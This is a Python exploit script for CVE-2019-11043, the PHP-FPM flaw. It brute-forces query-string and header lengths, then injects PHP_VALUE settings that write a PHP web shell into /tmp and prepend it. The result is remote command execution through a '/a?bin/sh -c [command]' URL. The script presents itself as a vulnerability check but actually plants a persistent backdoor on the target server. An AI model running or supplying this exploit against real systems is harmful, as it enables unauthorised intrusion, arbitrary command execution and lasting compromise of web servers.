import requests, argparse, sys, time

def inlineopts():
	""" Parsing command args """
	parser = argparse.ArgumentParser()

	parser.add_argument("-u",
		help='Target URL (ex: http://localhost/index.php)',
		type=str,
		required=True)

	return parser.parse_args()

opt = inlineopts()

hash_strndup="Ebut"

php_settings = [
	"short_open_tag=1;;;;;;;",
	"html_errors=0;;;;;;;;;;",
	"include_path=/tmp;;;;;;",
	"auto_prepend_file=a;;;;",
	"log_errors=1;;;;;;;;;;;",
	"error_reporting=2;;;;;;",
	"error_log=/tmp/a;;;;;;;",
	"extension_dir=%22%3C%3F=%60%22;;;",
	"extension=%22$_GET%5Ba%5D%60%3F%3E%22",
]

rce_command = "a=/bin/sh+-c+'which+which'"
rce_check = "bin/which"

pre_output = "[*]"
query_string_length = []
header_value_length = 1

for x in range(1500,1950):
	res = requests.get(opt.u+"/PHP%0Ainfooooooooooooooooooo.php?"+("U"*x), headers={"User-Agent":"CVE-2019-11043","Foo":"A", hash_strndup:"qazxs edcvf"})
	if res.status_code >= 500:
		query_string_length.append(x)

qsl_list = [(query_string_length[-1]-10), (query_string_length[-1]-5), query_string_length[-1]]
print("{} QSL candidate: {}".format(pre_output, ", ".join(str(x) for x in qsl_list)))

r = True
for qslnum in qsl_list:
	while r:
		res = requests.get(
			opt.u+"/PHP_VALUE%0Asession.auto_start=1;;;?"+("U"*qslnum),
			headers={
				"User-Agent":"CVE-2019-11043",
				"Foo":("A"*header_value_length),
			hash_strndup:"qazxs edcvf"
		})

		check = requests.get(
			opt.u+"/PHP_VALUE%0Asession.auto_start=1;;;?"+("U"*qslnum),
			headers={
				"User-Agent":"CVE-2019-11043",
				"Foo":("A"*header_value_length),
			hash_strndup:"qazxs edcvf"
		})

		if "Set-Cookie" in check.headers and "PHPSESSID" in check.headers["Set-Cookie"]:
			print("{} Target seems vulnerable (QSL:{}/HVL:{}): {}".format(
				pre_output,
				str(qslnum),
				str(header_value_length),
				check.headers["Set-Cookie"]
			))

			def_hvl = header_value_length
			def_qsl = qslnum

			r = False

			break

		header_value_length = (header_value_length+1)

		if header_value_length > 556:
			header_value_length = 1
			break

	if r is False:
		break

try:
	def_hvl
except:
	print("[-] Something wrong...")
	sys.exit()

for qslnum in qsl_list:
	res = requests.get(opt.u+"/PHP_VALUE%0Asession.auto_start=0;;;?"+("Q"*qslnum), headers={"User-Agent":"CVE-2019-11043","Foo":("A"*def_hvl), hash_strndup:"qazxs edcvf"})

for zz in range(qsl_list[0],(qsl_list[-1])):
	for setting in php_settings:
		intremove = (len(setting)+4)

		res = requests.get(opt.u+"/PHP_VALUE%0A"+setting+"?"+rce_command+"&"+("Q"*(zz-intremove)), headers={"User-Agent":"CVE-2019-11043","Foo":("A"*def_hvl), "Ebut":"qazxs edcvf"})
		time.sleep(0.5)

		if rce_check in res.text:
			print("[+] Detected Vulnerability : True")
			print("[+] /a?bin/sh+-c+'[command]'")
			sys.exit()



for i in range(0,2):
	res = requests.get(opt.u+"?a=usr/bin/which+which")
	if rce_check in res.text:
		print("[+] Detected Vulnerability : True")
		print("[+] /a?bin/sh+-c+'[command]'")
		sys.exit()
  
print("[-] Detected Vulnerability : False")
